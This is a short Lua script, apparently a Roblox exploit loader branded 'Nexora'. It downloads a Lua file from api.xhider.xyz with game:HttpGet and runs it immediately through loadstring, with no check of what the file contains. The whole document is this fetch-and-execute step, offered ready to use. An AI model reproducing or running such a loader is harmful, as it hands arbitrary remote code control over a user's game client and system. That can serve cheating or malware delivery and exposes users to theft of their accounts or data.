local URL = "https://api.xhider.xyz/files/v4/loaders/05e3ced7e4b3b93d180671523c91d2fd.lua"

local ok, err = pcall(function()
    local source = game:HttpGet(URL)
    local script = assert(loadstring(source))
    script()
end)

if not ok then
    warn("[Nexora] Loader Error: " .. tostring(err))
end
